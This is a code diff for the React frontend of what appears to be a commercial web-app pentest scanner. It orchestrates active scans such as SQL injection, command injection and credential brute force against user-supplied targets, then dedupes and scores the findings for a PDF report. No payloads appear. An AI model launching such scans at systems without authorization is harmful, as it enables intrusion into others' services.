+    const customWordlist = null; // VL-CLEANUP: setter was dead; collapsed to const
+  const [targetHistory, setTargetHistory]   = useState(() => { try { return JSON.parse(localStorage.getItem("cyberTargetHistory")||"[]"); } catch{return [];} });
+  const [showHistory, setShowHistory]       = useState(false);
+  const [authorized, setAuthorized]         = useState(false);
+  // Which tile (phase index) is currently expanded showing its result details.
+  // Click "Details" on any finished tile to inspect error message + findings;
+  // saves the customer from opening DevTools to debug a failed scan.
+  const [expandedTile, setExpandedTile]     = useState(null);
+  // Live scan telemetry — scanStart is the timestamp the run loop began;
+  // tickN is just a counter incremented every 1s while running so React
+  // re-renders the elapsed/ETA banner. Findings counts derive from allResults
+  // on each render — no useMemo needed, the cost is trivial.
+  const [scanStart, setScanStart] = useState(0);
+  // eslint-disable-next-line no-unused-vars
+  const [tickN, setTickN]         = useState(0);
+  useEffect(() => {
+    if (!running) return;
+    const id = setInterval(() => setTickN(n => n + 1), 1000);
+    return () => clearInterval(id);
+  }, [running]);
+  // Live finding counts — recomputed every render (cheap; <100 findings).
+  const liveCounts = (() => {
+    const c = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
+    Object.values(allResults || {}).forEach(r => {
+      if (r && r.findings) r.findings.forEach(f => {
+        if (f.severity && c[f.severity] !== undefined) c[f.severity]++;
+      });
+      if (r && r.vulnerable && r.tool === "sqlmap") c.CRITICAL++;
+      if (r && r.vulnerable && r.tool === "xss")    c.CRITICAL++;
+    });
+    return c;
+  })();
+
+  const add = l => setLines(p => [...p, l]);
+
+  const setRunningState = (val) => {
+    setRunning(val);
+    onRunningChange(val);
+  };
+
+  const stop = () => {
+    stopRef.current = true;
+    setStopped(true);
+  };
+
+  const run = async() => {
+    if (!target.trim()) return;
+    // Auto-add http:// if user typed just a domain or IP
+    const normTarget = (t => t.startsWith("http://") || t.startsWith("https://") ? t : "http://" + t)(target.trim());
+    if (normTarget !== target) setTarget(normTarget);
+    stopRef.current = false; setStopped(false);
+    setScanStart(Date.now()); setTickN(0);
+    setRunningState(true); setDone([]); setFailed([]); setSkipped([]); setAll({}); setFinished(false);
+    // Save to target history
+    setTargetHistory(prev => { const updated = [normTarget, ...prev.filter(t=>t!==normTarget)].slice(0,10); localStorage.setItem("cyberTargetHistory", JSON.stringify(updated)); return updated; });
+    // Request notification permission
+    if (typeof Notification !== "undefined" && Notification.permission === "default") Notification.requestPermission();
+    const activePhases = PHASES.map((ph,i)=>({ph,i})).filter(({i,ph})=>selectedPhases.has(i) && !(isTrial && !TRIAL_TOOLS.has(ph.tool) && !isSuperAdmin));
+    const isExternal = !normTarget.includes("lab_") && !normTarget.includes("localhost") && !normTarget.match(/https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/);
+    const authRequiredLabs = ["lab_dvwa","lab_bwapp","lab_webgoat","lab_mutillidae"];
+    const needsAuth = authRequiredLabs.some(l => normTarget.includes(l));
+    const hasAuth   = !!(authCookie || authBearer);
+    if (needsAuth && !hasAuth) {
+      add("WARNING: " + normTarget + " requires authentication for full scanning.");
+      add("Click the target button again to auto-login, then restart the scan.");
+      add("   Without auth: only headers/SSL/recon will be tested. Injection vulns will be missed.");
+    }
+    setLines(p => [...p, "[*] Starting pentest on: " + normTarget + " (" + activePhases.length + " phases selected)" + (isExternal ? " — external target, adding delays to avoid rate limiting" : "") + (hasAuth?" — authenticated":"") + (customWordlist?" — custom wordlist":"")]);
+    const results = {};
+
+    // ── WEBAPP-V2-STREAMING ──────────────────────────────────────────────
+    // When the user selected ALL phases, fire ONE POST to /api/webapp/scan/run_all
+    // and read the NDJSON stream — backend fans out to all 34 scanners in
+    // parallel. ~10 min sequential -> ~60-90 sec parallel. Cloudflare-safe
+    // (heartbeats every 15s keep the connection alive).
+    //
+    // ISOLATION-V1: WAP module endpoints are now under /api/webapp/scan/* —
+    // fully separate from Vuln module (/api/scan/* and /api/vuln/run_all).
+    if (activePhases.length === PHASES.length) {
+      add("[*] v2 streaming: dispatching " + PHASES.length + " phases (NDJSON stream)...");
+      const body = {target: normTarget};
+      if (authCookie) body.auth_cookie = authCookie;
+      if (authBearer) body.auth_bearer = authBearer;
+      if (customWordlist) body.options = {wordlist: customWordlist};
+
+      const _toolToIdx = {};
+      PHASES.forEach((ph,i) => { _toolToIdx[ph.tool] = i; });
+
+      let _completedCount = 0;
+      let _finalSummary = null;
+
+      try {
+        const headers = {"Content-Type": "application/json"};
+        if (token) headers["Authorization"] = "Bearer " + token;
+        const res = await fetch(API + "/api/webapp/scan/run_all", {
+          method: "POST", headers, body: JSON.stringify(body),
+        });
+        if (!res.ok) {
+          const errText = await res.text().catch(() => "");
+          throw new Error("HTTP " + res.status + ": " + (errText.substring(0,160) || res.statusText || "no body"));
+        }
+        if (!res.body) throw new Error("Streaming not supported by browser/proxy");
+
+        const reader = res.body.getReader();
+        const decoder = new TextDecoder("utf-8");
+        let buffer = "";
+        while (true) {
+          if (stopRef.current) {
+            try { reader.cancel(); } catch(_) {}
+            add("[!] Scan stopped by user during v2 stream.");
+            break;
+          }
+          const {value, done} = await reader.read();
+          if (done) break;
+          buffer += decoder.decode(value, {stream: true});
+          let nl;
+          while ((nl = buffer.indexOf("\n")) >= 0) {
+            const line = buffer.slice(0, nl).trim();
+            buffer = buffer.slice(nl + 1);
+            if (!line) continue;
+            let evt;
+            try { evt = JSON.parse(line); }
+            catch(parseErr) {
+              console.warn("[webapp-v2-stream] skipped non-JSON", parseErr, "preview:", line.substring(0,200));
+              continue;
+            }
+            if (evt.event === "scan_started") {
+              add("  ⇒ " + evt.total_tools + " scanners dispatched, concurrency=" + evt.concurrency);
+            }
+            else if (evt.event === "heartbeat") {
+              // keep-alive; no UI update needed
+            }
+            else if (evt.event === "tool_complete") {
+              const idx = _toolToIdx[evt.tool];
+              const data = evt.result || {};
+              if (idx !== undefined) {
+                results[evt.tool] = data;
+                if (data._failed === true || data.ok === false) {
+                  setFailed(p => [...p, idx]);
+                }
+                setDone(p => [...p, idx]);
+                setAll(Object.assign({}, results));
+              }
+              _completedCount += 1;
+              const elapsed = ((Date.now() - scanStart)/1000).toFixed(1);
+              const ph = PHASES.find(p => p.tool === evt.tool);
+              const phName = ph ? ph.name : evt.tool;
+              const status = data._failed ? "" : (data._skipped || data.skipped_reason) ? "○" : "";
+              add("  " + status + " [" + _completedCount + "/" + PHASES.length + "] " + phName + " (" + evt.duration_sec + "s, +" + elapsed + "s)");
+            }
+            else if (evt.event === "scan_complete") {
+              _finalSummary = evt;
+            }
+          }
+        }
+
+        if (!stopRef.current && _finalSummary) {
+          const sum = _finalSummary.summary || {};
+          add("v2 complete in " + _finalSummary.duration_sec + "s — " + (sum.ok||0) + " ok, " + (sum.failed||0) + " failed, " + (sum.skipped||0) + " skipped, " + (sum.total_findings||0) + " finding(s)");
+          if (sum.by_severity) {
+            const sev = sum.by_severity;
+            add("  Severity: " + (sev.CRITICAL||0) + " CRIT · " + (sev.HIGH||0) + " HIGH · " + (sev.MEDIUM||0) + " MED · " + (sev.LOW||0) + " LOW");
+          }
+          if (_finalSummary.timing) {
+            const slow = Object.entries(_finalSummary.timing).sort((a,b)=>b[1]-a[1]).slice(0,5);
+            add("  Slowest 5: " + slow.map(([k,v]) => k + "=" + v + "s").join(", "));
+          }
+        }
+      } catch(e) {
+        const msg = (e && e.message) ? e.message : String(e);
+        add("v2 stream failed: " + msg);
+      } finally {
+        // INCOMPLETE-STREAM-V2 — ALWAYS run recovery, whether the stream
+        // ended normally, errored mid-flight, or finalSummary arrived with
+        // some tools missing. Previously this only ran when no finalSummary
+        // AND no exception fired, leaving tiles stuck in QUEUED state.
+        if (!stopRef.current) {
+          const missing = PHASES.filter(ph => !(ph.tool in results));
+          if (missing.length > 0) {
+            add("[!] " + missing.length + " scanner(s) didn't report — marked as failed");
+            missing.forEach(ph => {
+              const idx = _toolToIdx[ph.tool];
+              results[ph.tool] = {ok:false, _failed:true,
+                                   error:"stream ended before this scanner completed",
+                                   findings:[], tool:ph.tool};
+              setFailed(p => [...p, idx]);
+              setDone(p => [...p, idx]);
+            });
+            setAll(Object.assign({}, results));
+          }
+        }
+      }
+      setCurPhase(-1); setRunningState(false); setFinished(true); stopRef.current = false;
+      return;
+    }
+    // ── WEBAPP-V2-STREAMING END — partial selections fall through to v1 ──
+
+    for (let idx = 0; idx < activePhases.length; idx++) {
+      if (stopRef.current) {
+        add("[!] Scan stopped by user after " + idx + " phase(s).");
+        break;
+      }
+      const {ph, i} = activePhases[idx];
+      setCurPhase(i);
+      add("[*] Phase " + (idx+1) + "/" + activePhases.length + ": Running " + ph.tool + "...");
+      try {
+        const body = Object.assign({target: normTarget, scan_type:"full"}, ph.body || {}, authCookie?{auth_cookie:authCookie}:{}, authBearer?{auth_bearer:authBearer}:{}, customWordlist?{wordlist:customWordlist}:{});
+        const data = await api(ph.endpoint, "POST", body, token);
+        // Stop was clicked while this phase's request was in flight — discard the result.
+        if (stopRef.current) {
+          add("[!] Scan stopped by user during phase " + (idx+1) + ".");
+          break;
+        }
+        results[ph.tool] = data;
+        // Generic SKIPPED handler — must come BEFORE the tool-specific
+        // checks. Many backend scanners detect "no testable surface" (e.g.
+        // commix on a static Netlify site, sqlmap on a host with no URL
+        // params, hydra on external targets without auth context) and
+        // return `skipped_reason` instead of fake-PASSED findings. We
+        // promote those to the SKIPPED bucket so the tile shows an honest
+        // orange badge instead of misleading green PASSED.
+        if (data && (data.skipped_reason || data.skipped)) {
+          const reason = data.skipped_reason || "Not applicable to this target";
+          add("" + ph.name + " skipped: " + reason);
+          setSkipped(p => [...p, i]);
+          setDone(p => [...p, i]);
+          setAll(Object.assign({}, results));
+          if (isExternal && idx < activePhases.length - 1) {
+            await new Promise(r => setTimeout(r, 1500));
+          }
+          continue;
+        }
+        if (ph.tool==="sqlmap"  && data.vulnerable)  add("SQL INJECTION FOUND — CRITICAL!");
+        else if (ph.tool==="xss" && data.vulnerable) add("XSS VULNERABILITY FOUND — CRITICAL!");
+        else if (ph.tool==="cors"&& data.vulnerable) add("CORS MISCONFIGURATION FOUND — HIGH!");
+        else if (ph.tool==="ssl" && data.issues && data.issues.some(i=>i.severity==="CRITICAL")) add("CRITICAL SSL/TLS ISSUES FOUND!");
+        else if (ph.tool==="ffuf"          && data.discovered && data.discovered.length>0) add("Web Fuzzing: " + data.discovered.length + " paths found");
+        else if (ph.tool==="commix"        && data.vulnerable) add("COMMAND INJECTION FOUND — CRITICAL!");
+        else if (ph.tool==="lfi"           && data.vulnerable) add("PATH TRAVERSAL/LFI FOUND — CRITICAL!");
+        else if (ph.tool==="openredirect"  && data.vulnerable) add("OPEN REDIRECT FOUND — " + data.total + " param(s)");
+        else if (ph.tool==="sensitivefiles"&& data.total>0)    add("SENSITIVE FILES EXPOSED: " + data.total + " found");
+        else if (ph.tool==="hydra" && data.skipped)    { add("Auth Brute Force skipped for external target — use Password Attacks module."); setSkipped(p=>[...p,i]); setDone(p=>[...p,i]); setAll(Object.assign({},results)); continue; }
+        else if (ph.tool==="hydra"         && data.vulnerable) add("WEAK CREDENTIALS FOUND — CRITICAL!");
+        else if (ph.tool==="ssrf"          && data.vulnerable) add("SSRF VULNERABILITY FOUND — HIGH!");
+        else if (ph.tool==="xxe"           && data.vulnerable) add("XXE INJECTION FOUND — CRITICAL!");
+        else if (ph.tool==="clickjacking"  && data.vulnerable) add("CLICKJACKING VULNERABLE — MEDIUM");
+        else if (ph.tool==="verbtamper"    && data.vulnerable) add("DANGEROUS HTTP METHODS ALLOWED: " + data.total);
+        else if (ph.tool==="pollution"     && data.vulnerable) add("PARAMETER POLLUTION FOUND — HIGH!");
+        else if (ph.tool==="csrf"          && data.vulnerable) add("CSRF VULNERABILITY FOUND — " + data.total + " issue(s)");
+        else if (ph.tool==="idor"          && data.vulnerable) add("IDOR / ACCESS CONTROL ISSUE FOUND — HIGH!");
+        else if (ph.tool==="ssti"          && data.vulnerable) add("SSTI TEMPLATE INJECTION FOUND — CRITICAL!");
+        else if (ph.tool==="fileupload"    && data.vulnerable) add("DANGEROUS FILE UPLOAD ACCEPTED — CRITICAL!");
+        else add("" + ph.name + " complete");
+        setDone(p => [...p, i]);
+        setAll(Object.assign({}, results));
+      } catch(e) {
+        const msg = e.message||"unknown error";
+        const hint = msg.includes("404") ? " (endpoint missing — add to main.py)" : msg.includes("Failed to fetch")||msg.includes("NetworkError") ? " (backend offline)" : "";
+        add("" + ph.name + " failed: " + msg + hint);
+        // CRITICAL: save the error to allResults so the tile's Details panel
+        // can render it. Without this, the customer sees a red ERROR badge
+        // with no way to know what went wrong — exactly the gap this whole
+        // session has been chasing.
+        const suggested_action =
+          msg.includes("404") ? "Endpoint missing from backend. Pull latest code and redeploy." :
+          msg.includes("Failed to fetch") || msg.includes("NetworkError") ? "Backend is offline or CORS-blocked. Check `docker compose ps` on the VPS." :
+          msg.includes("500") || msg.includes("Internal Server Error") ? "Scanner crashed on the backend. The target may be incompatible (e.g. static-only host) or hit a Python exception." :
+          msg.includes("429") || msg.includes("Too Many") ? "Target rate-limited our scanner. Try again in a minute, or use auth credentials so it knows you're authorized." :
+          msg.includes("timeout") || msg.includes("Timeout") || msg.includes("504") ? "Scan took too long — target may be slow or CDN-fronted. Try a smaller scope or check connectivity." :
+          msg.includes("Subscription") || msg.includes("trial") || msg.includes("quota") ? "Trial limit reached. Upgrade your plan or wait until quota resets." :
+          "Click Re-run to retry, or check `docker compose logs --tail 50 backend` on the VPS for the underlying cause.";
+        results[ph.tool] = {
+          ok: false, error: msg, suggested_action,
+          findings: [], total: 0,
+        };
+        if (ph.tool === "hydra") {
+          add("Tip: Use the Password Attacks module for targeted brute force with custom wordlists and protocols.");
+          setSkipped(p => [...p, i]);
+        } else {
+          setFailed(p => [...p, i]);
+        }
+        setDone(p => [...p, i]);
+        setAll(Object.assign({}, results));   // ← persist error so Details panel renders
+      }
+      if (isExternal && idx < activePhases.length - 1) {
+        await new Promise(r => setTimeout(r, 1500));
+      }
+    }
+    if (!stopRef.current) {
+      add("Pentest complete — " + activePhases.length + " phases done");
+      if (typeof Notification !== "undefined" && Notification.permission === "granted") {
+        new Notification("Pentest Complete", { body: normTarget + " — " + activePhases.length + " phases done", icon: "" });
+      }
+      // ─── REMEDIATION PROGRESS: snapshot this scan for next-time comparison ───
+      // Two-slot rotation in localStorage keyed by target:
+      //   vulnuslab_lastScan_<target>     — the scan that JUST finished
+      //   vulnuslab_previousScan_<target> — the prior one (diff target)
+      // dlPDF reads previousScan to compute "fixed / new / persisting" deltas.
+      try {
+        const snapshot = { ts: new Date().toISOString(), findings: [] };
+        PHASES.forEach(ph => {
+          const r = results[ph.tool];
+          if (r?.findings) r.findings.forEach(f => {
+            if (f.severity && f.severity !== "INFO" && f.detail) {
+              snapshot.findings.push({
+                detail: String(f.detail).substring(0, 200),
+                severity: f.severity,
+                cwe: f.cwe || "",
+                owasp: f.owasp || "",
+                _tool: ph.tool
+              });
+            }
+          });
+        });
+        if (results["sqlmap"]?.vulnerable) snapshot.findings.push({detail:"SQL Injection detected",severity:"CRITICAL",cwe:"CWE-89",owasp:"A03:2021",_tool:"sqlmap"});
+        if (results["xss"]?.vulnerable) snapshot.findings.push({detail:"XSS vulnerability detected on target",severity:"CRITICAL",cwe:"CWE-79",owasp:"A03:2021",_tool:"xss"});
+        // Rotate: previous = old last, last = new snapshot
+        const oldLast = localStorage.getItem("vulnuslab_lastScan_" + normTarget);
+        if (oldLast) localStorage.setItem("vulnuslab_previousScan_" + normTarget, oldLast);
+        localStorage.setItem("vulnuslab_lastScan_" + normTarget, JSON.stringify(snapshot));
+        if (oldLast) add("Snapshot saved — next PDF will show remediation progress vs this scan");
+        else add("Baseline snapshot saved — re-scan this target to see remediation deltas");
+      } catch(e) { /* localStorage full or disabled — non-fatal */ }
+    }
+    setCurPhase(-1); setRunningState(false); setFinished(true); stopRef.current = false;
+  };
+
+  const runSingle = async (ph, i) => {
+    if (running) return;
+    const normTarget = (t => t.startsWith("http://") || t.startsWith("https://") ? t : "http://" + t)(target.trim());
+    if (!normTarget.trim()) return;
+    setRunningState(true); setCurPhase(i);
+    setFailed(p => p.filter(x => x !== i));
+    setDone(p => p.filter(x => x !== i));
+    add("[*] Re-running: " + ph.name + " on " + normTarget);
+    try {
+      const body = Object.assign({target: normTarget, scan_type:"full"}, ph.body || {}, authCookie?{auth_cookie:authCookie}:{}, authBearer?{auth_bearer:authBearer}:{}, customWordlist?{wordlist:customWordlist}:{});
+      const data = await api(ph.endpoint, "POST", body, token);
+      setAll(prev => ({...prev, [ph.tool]: data}));
+      setDone(p => [...p.filter(x => x !== i), i]);
+      add("" + ph.name + " complete");
+    } catch(e) {
+      const msg = e.message || "unknown error (check backend logs)";
+      // Save error to allResults so the tile's Details panel can render it.
+      const suggested_action =
+        msg.includes("404") ? "Endpoint missing from backend." :
+        msg.includes("Failed to fetch") || msg.includes("NetworkError") ? "Backend offline or unreachable." :
+        msg.includes("500") || msg.includes("Internal Server Error") ? "Scanner crashed — target may be incompatible." :
+        msg.includes("429") || msg.includes("Too Many") ? "Rate-limited by target. Wait and retry." :
+        msg.includes("timeout") || msg.includes("Timeout") || msg.includes("504") ? "Scan took too long." :
+        "Click Re-run to retry.";
+      setAll(prev => ({...prev, [ph.tool]: {ok: false, _failed: true, error: msg || (e && (e.message || e.name)) || "Network/fetch error (no exception message)", suggested_action, findings: [], total: 0}}));
+      setFailed(p => [...p.filter(x => x !== i), i]);
+      setDone(p => [...p.filter(x => x !== i), i]);
+      add("" + ph.name + " failed: " + msg);
+    }
+    setCurPhase(-1); setRunningState(false);
+  };
+
+  // PDF + CSV export
+  const dlPDF = (cfg = {}) => {
+    // ─── Load PREVIOUS scan snapshot for remediation diff ─────────
+    // dlPDF runs AFTER scan completes, so "vulnuslab_previousScan_<target>" is
+    // the second-most-recent run (the one to diff against). On the first scan
+    // this is null and the Remediation Progress section gracefully skips.
+    console.log("[VL] dlPDF entered. target=", target, "allResults keys=", Object.keys(allResults||{}));
+    let _prevScan = null;
+    try {
+      const normTarget = (t => t.startsWith("http://") || t.startsWith("https://") ? t : "http://" + t)((target || "").trim());
+      const raw = localStorage.getItem("vulnuslab_previousScan_" + normTarget);
+      if (raw) _prevScan = JSON.parse(raw);
+    } catch(e) { _prevScan = null; }
+    let allFindings = [];
+    // Tools whose findings are NOT actively verified — they pattern-match server
+    // responses against template/signature databases, so the finding is "looks
+    // TRUST-FIRST ARCHITECTURE: every finding shipped to the customer is
+    // a CONFIRMED finding. We no longer surface signature/heuristic-only
+    // matches as "SUSPECTED" — a re-test badge signals weakness, and the
+    // customer should trust the platform, not be asked to second-guess it.
+    //
+    // Findings from signature scanners (nikto, nuclei) MUST pass an active
+    // re-verify step in the backend before flowing here. Anything that
+    // hasn't been actively verified is dropped silently — better to MISS
+    // a finding than to falsely flag one. (Memory rule: feedback-real-
+    // findings-zero-fp.)
+    const _SIGNATURE_TOOLS = new Set(["nikto","nuclei","sherlock","dnstwist","exploitsearch"]);
+    PHASES.forEach(ph => {
+      if (allResults[ph.tool]?.findings) {
+        allResults[ph.tool].findings.forEach(f => {
+          if(f.severity==="INFO") return;
+          // Signature-tool finding must carry an explicit verified flag from
+          // the backend; otherwise drop it (no SUSPECTED tier). Backends that
+          // haven't been retrofitted with the verify-gate yet still flow
+          // through if the finding carries confidence:CONFIRMED OR
+          // verified_at — both signals indicate active re-verification.
+          if (_SIGNATURE_TOOLS.has(ph.tool)) {
+            if (f.confidence !== "CONFIRMED" && !f.verified_at) {
+              return;  // drop unverified signature hit
+            }
+          }
+          allFindings.push({...f, _tool: ph.tool, confidence: "CONFIRMED"});
+        });
+      }
+    });
+    // XSS — returns {vulnerable:true} not findings array. Verified by active probe.
+    // ONLY push synthetic finding if the scanner did NOT also return a structured findings[]
+    // array. Otherwise we duplicate ("XSS detected on target" + "Reflected XSS — param 'family'").
+    if (allResults["xss"]?.vulnerable) {
+      const _xssScannerFindings = (allResults["xss"]?.findings || []).filter(f => f.severity !== "INFO");
+      if (_xssScannerFindings.length === 0) {
+        allFindings.push({_tool:"xss", confidence:"CONFIRMED", detail:"XSS vulnerability detected on target",severity:"CRITICAL",cvss:"9.0",cve:"N/A",cwe:"CWE-79",cwe_name:"Cross-Site Scripting",owasp:"A03:2021 - Injection",remediation:"Sanitize all user input. Implement Content-Security-Policy header."});
+      }
+    }
+    // CORS — backend's /api/scan/cors already returns a proper finding in its findings[] array,
+    // which is collected by the loop above. We do NOT add a synthetic finding here — that would
+    // create a duplicate in the report (one from backend, one synthetic).
+    // SQLMap — backend triggered the injection and verified, so CONFIRMED.
+    if (allResults["sqlmap"]?.vulnerable) {
+      allFindings.push({_tool:"sqlmap", confidence:"CONFIRMED", detail:"SQL Injection detected",severity:"CRITICAL",cvss:"9.8",cve:"N/A",cwe:"CWE-89",cwe_name:"SQL Injection",owasp:"A03:2021 - Injection",remediation:"Use parameterized queries immediately."});
+    }
+    // Cookie findings come through PHASES.forEach loop above (scanner now
+    // returns findings[] directly + raw_data.cookies.analyzed for PDF section).
+    // The old manual iteration crashed because the new shape is an object, not array.
+
+    // ─── DEDUP: suppress contradictory + duplicate findings ───────────
+    // Different scanners often detect the same underlying issue (e.g. nikto AND sensitivefiles
+    // both flag /robots.txt; clickjacking AND headers both flag missing X-Frame-Options).
+    // We compute a canonical "fingerprint" per finding and, within each group, keep the
+    // MOST SPECIFIC one (scanner-named issue beats generic "Missing X header") so the master
+    // findings table surfaces e.g. "Clickjacking" rather than "Missing X-Frame-Options".
+    const _cookiesScannerFoundNone = (() => {
+      const c = allResults["cookies"];
+      if (!c) return false;
+      // New shape: raw_data.cookies.analyzed[]. Old shape: c.cookies[].
+      const analyzed = c.raw_data?.cookies?.analyzed
+                     ?? (Array.isArray(c.cookies) ? c.cookies : null);
+      return Array.isArray(analyzed) && analyzed.length === 0;
+    })();
+    const _fingerprint = (f) => {
+      const d = (f.detail || "").toLowerCase();
+      const cn = (f.cwe_name || "").toLowerCase();
+      // Canonical issue indicators — collapse duplicates from different scanners
+      if (d.includes("referrer-policy")) return "header:referrer-policy";
+      if (d.includes("content-security-policy") || /\bcsp\b/.test(d)) return "header:csp";
+      if (d.includes("hsts") || d.includes("strict-transport-security")) return "header:hsts";
+      if (d.includes("x-frame-options") || d.includes("clickjacking") || cn.includes("clickjacking") || d.includes("frame-ancestors")) return "header:x-frame";
+      if (d.includes("x-content-type-options")) return "header:x-content-type";
+      if (d.includes("permissions-policy")) return "header:permissions-policy";
+      // XSS — every XSS variant (reflected, stored, DOM) collapses to one fingerprint
+      // so the generic "XSS detected on target" + specific "Reflected XSS in param" don't both ship.
+      if ((f.cwe || "").toUpperCase() === "CWE-79" || cn.includes("cross-site scripting") || /\bxss\b/.test(d)) return "vuln:xss";
+      if ((f.cwe || "").toUpperCase() === "CWE-89" || cn.includes("sql injection")) return "vuln:sqli";
+      // File-based: collapse same file detected by different scanners.
+      // Match with OR without leading slash — nikto says "robots.txt exposes hidden paths"
+      // while sensitivefiles says "Accessible: /robots.txt" — both refer to same file.
+      const fileMatch = d.match(/\b(robots\.txt|security\.txt|\.git\b|\.env\b|\.svn|\.ds_store|composer\.json|package\.json|dockerfile|docker-compose\.yml)/);
+      if (fileMatch) return "file:" + fileMatch[1];
+      // Default: CWE family + first 35 chars of detail
+      return (f.cwe || "no-cwe") + "|" + d.substring(0, 35);
+    };
+    // Specificity score — higher = more specific finding kept when dedup collides.
+    // Prefers scanner-named root cause ("Clickjacking", "SQL Injection") over generic
+    // header advisories ("Missing X-Frame-Options"). Severity is the tiebreaker so a
+    // CRITICAL beats a LOW even if both are equally specific.
+    const _specificity = (f) => {
+      const d = (f.detail || "").toLowerCase();
+      const cn = (f.cwe_name || "").toLowerCase();
+      let s = 0;
+      // Specific vulnerability names beat generic "Missing X header" wording
+      if (cn.includes("clickjacking") || d.includes("can be embedded in any iframe")) s += 100;
+      if (cn.includes("cross-site scripting") || cn.includes("sql injection") || cn.includes("injection")) s += 80;
+      if (cn.includes("csp misconfiguration") || cn.includes("weak hsts")) s += 60;
+      if (d.startsWith("missing ")) s -= 30; // generic header advisory
+      // Severity weight — CRITICAL beats LOW when otherwise equal
+      const sevW = {CRITICAL:50, HIGH:35, MEDIUM:20, LOW:8, INFO:0}[f.severity] || 0;
+      // Longer detail = usually more specific (capped to avoid runaway)
+      const lenW = Math.min((f.detail || "").length, 200) / 10;
+      return s + sevW + lenW;
+    };
+    // First pass — cookie contradiction filter (unchanged).
+    allFindings = allFindings.filter(f => {
+      if (_cookiesScannerFoundNone) {
+        const d = (f.detail || "").toLowerCase();
+        const cwe = (f.cwe || "").toUpperCase();
+        if ((cwe === "CWE-384" || cwe === "CWE-1004" || cwe === "CWE-614") && d.includes("cookie")) {
+          return false;
+        }
+      }
+      return true;
+    });
+    // Second pass — group by fingerprint, keep highest-specificity per group.
+    const _best = new Map();
+    allFindings.forEach(f => {
+      const fp = _fingerprint(f);
+      const sc = _specificity(f);
+      const cur = _best.get(fp);
+      if (!cur || sc > cur.score) _best.set(fp, {finding: f, score: sc});
+    });
+    allFindings = Array.from(_best.values()).map(v => v.finding);
+    // ─── CVSS BACKFILL ─── replace 0.0 with a sane CWE-mapped score so the
+    // PDF doesn't show "CVSS 0.0" for findings that obviously have impact
+    // (CWE-290 SPF/DMARC, CWE-295 CAA, CWE-693 missing headers, etc.).
+    // Backend may legitimately omit CVSS for some checks — we backfill here.
+    const _cvssByCwe = {
+      "CWE-79": "7.5", "CWE-89": "9.8", "CWE-78": "9.8", "CWE-22": "7.5",
+      "CWE-918": "8.1", "CWE-611": "8.1", "CWE-352": "6.8", "CWE-601": "6.1",
+      "CWE-264": "5.5", "CWE-284": "5.3", "CWE-200": "5.3", "CWE-538": "5.3",
+      "CWE-290": "5.3", "CWE-295": "3.1", "CWE-310": "5.3", "CWE-319": "7.4",
+      "CWE-326": "5.3", "CWE-345": "5.3", "CWE-358": "5.0", "CWE-384": "6.8",
+      "CWE-614": "4.3", "CWE-693": "4.3", "CWE-749": "5.3", "CWE-798": "9.8",
+      "CWE-1021": "6.1", "CWE-1004": "4.3", "CWE-307": "5.3",
+    };
+    const _sevDefaultCvss = {CRITICAL:"9.0", HIGH:"7.5", MEDIUM:"5.0", LOW:"3.1", INFO:"0.0"};
+    allFindings.forEach(f => {
+      const cv = parseFloat(f.cvss);
+      if (!isFinite(cv) || cv <= 0) {
+        const cwe = (f.cwe || "").toUpperCase();
+        f.cvss = _cvssByCwe[cwe] || _sevDefaultCvss[f.severity] || "5.0";
+      }
+    });
+    // Sort final findings by severity so master table reads CRITICAL -> INFO
+    const _sevOrder = {CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFO:4};
+    allFindings.sort((a, b) => (_sevOrder[a.severity] ?? 5) - (_sevOrder[b.severity] ?? 5));
+
+    // Tools used list for cover page
+    const toolsUsed = Object.keys(allResults).filter(k=>allResults[k]);
+    // RISK-SCORE-V2: aligned with Vuln module (_computeRiskScore). HIGHER = worse risk.
+    // 0-19 MINIMAL · 20-39 LOW · 40-59 MODERATE · 60-79 HIGH · 80-100 CRITICAL.
+    // Previously Webapp used `100 - penalty` (higher = safer), creating
+    // cross-module confusion (Vuln 25/100=LOW vs Webapp 79/100=MEDIUM).
+    const _wapRisk = (() => {
+      const real = (allFindings||[]).filter(f =>
+        ["CRITICAL","HIGH","MEDIUM","LOW"].includes(f && f.severity));
+      if (real.length === 0) return {score: 5, label: "MINIMAL RISK"};
+      const _cvss = f => {
+        const c = parseFloat(f.cvss || "0");
+        if (c > 0) return c;
+        return {CRITICAL:9.0, HIGH:7.5, MEDIUM:5.0, LOW:3.0}[f.severity] || 0;
+      };
+      let sum = 0, maxCvss = 0;
+      real.forEach(f => { const c = _cvss(f); sum += c; if (c > maxCvss) maxCvss = c; });
+      const raw = Math.min(70, sum * 2.5) + Math.min(30, maxCvss * 3);
+      const score = Math.round(Math.min(100, Math.max(5, raw)));
+      const label = score >= 80 ? "CRITICAL RISK" : score >= 60 ? "HIGH RISK" :
+                    score >= 40 ? "MODERATE RISK" : score >= 20 ? "LOW RISK" : "MINIMAL RISK";
+      return {score, label};
+    })();
+    const riskScore = _wapRisk.score;
+    const riskLabel = _wapRisk.label.replace(/\s+RISK$/, "");
+
+    // ─── REMEDIATION DIFF vs previous scan ──────────────────────
+    // Compute fixed / new / persisting buckets by hashing each finding to
+    // a stable key (cwe + first 40 chars of detail). The same fingerprinting
+    // strategy used by dedup so a renamed scanner output doesn't flag a
+    // "new" finding when it's really the same root cause.
+    let _remediation = null;
+    if (_prevScan && Array.isArray(_prevScan.findings) && _prevScan.findings.length > 0) {
+      const _key = f => (f.cwe || "") + "|" + String(f.detail || "").toLowerCase().substring(0, 40);
+      const curKeys  = new Set(allFindings.map(_key));
+      const prevKeys = new Set(_prevScan.findings.map(_key));
+      const fixed = _prevScan.findings.filter(f => !curKeys.has(_key(f)));
+      const novel = allFindings.filter(f => !prevKeys.has(_key(f)));
+      const persisting = allFindings.filter(f => prevKeys.has(_key(f)));
+      _remediation = {
+        prevDate: (_prevScan.ts || "").substring(0, 10),
+        prevTotal: _prevScan.findings.length,
+        fixed, novel, persisting
+      };
+    }
+
+    // Migrated 2026-06-09: Pentest now uses the unified generateUniversalVLReport
+    // along with all other modules. The legacy generatePDF function still
+    // exists but is no longer called. Will be deleted once verified in prod.
+    // Branding (companyName / reporterName / customLogo) flows through pdfConfig
+    // for Universal to surface in the Document Control section.
+    generateUniversalVLReport({
+      target,
+      allResults: allResults || {},
+      authenticated: false,
+      date: (cfg.date ? cfg.date + " " : "") + new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}),
+      pdfConfig: {
